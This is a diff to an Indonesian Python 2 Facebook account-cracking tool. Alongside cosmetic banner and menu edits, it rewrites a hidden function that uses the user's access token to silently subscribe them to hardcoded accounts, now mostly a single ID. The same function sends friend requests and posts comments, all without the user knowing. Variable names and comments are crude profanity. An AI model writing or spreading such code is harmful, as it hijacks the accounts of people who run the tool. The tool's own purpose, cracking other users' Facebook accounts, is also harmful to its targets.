@@ -97,7 +97,7 @@ logo = '''        ®
 \033[0;96m|____/|_| |_|_|_| |_/_/\_\/____\__, | \033[0m
 \033[0;96m                               |___/ \033[0m \033[0;91mMr.shinzy \033[0m
 
-1:00●━━━━━━━━━━●04:15 ⇆　　◁　　❚❚　　▷　　↻ 　
+1:00●━━━━━━━━━━●04:15 ⇆　　◁　　\033[0;92m❚❚\033[0m　　▷　　↻ 　
 　
  \033[0;96m || Created By M.ZAINUL UMAM \033[0m
  \033[0;96m || Github.com/shinzy24 \033[0m
@@ -165,7 +165,7 @@ def moch_yayan():
     print ' [%s6%s]. Check ingformasi akun fb'%(O,N);time.sleep(0.03)
     print ' [%s7%s]. Lihat hasil crack'%(O,N);time.sleep(0.03)
     print ' [%s8%s]. Settings user agent'%(O,N);time.sleep(0.03)
-    print ' [%s9%s]. Ingfo %sscript%s'%(O,N,O,N);time.sleep(0.03)
+    print ' [%s9%s]. Info %sscript%s'%(O,N,O,N);time.sleep(0.03)
     print ' [%s0%s]. logout (%shapus token%s)'%(M,N,M,N);time.sleep(0.03)
     pepek = raw_input('\n [*] menu : ')
     if pepek == '':
@@ -218,19 +218,19 @@ def moch_yayan():
     else:
         print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N);time.sleep(2);moch_yayan()
 
-# Yang ganti bot nya gw sumpahin mak lo mati ajg!
+# Yang ganti bot nya gw sumpahin mak lo ganteng ajg!
 def wuhan(kontol):
     try:
         kentod = kontol
-        requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/857799105/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
         requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
         requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
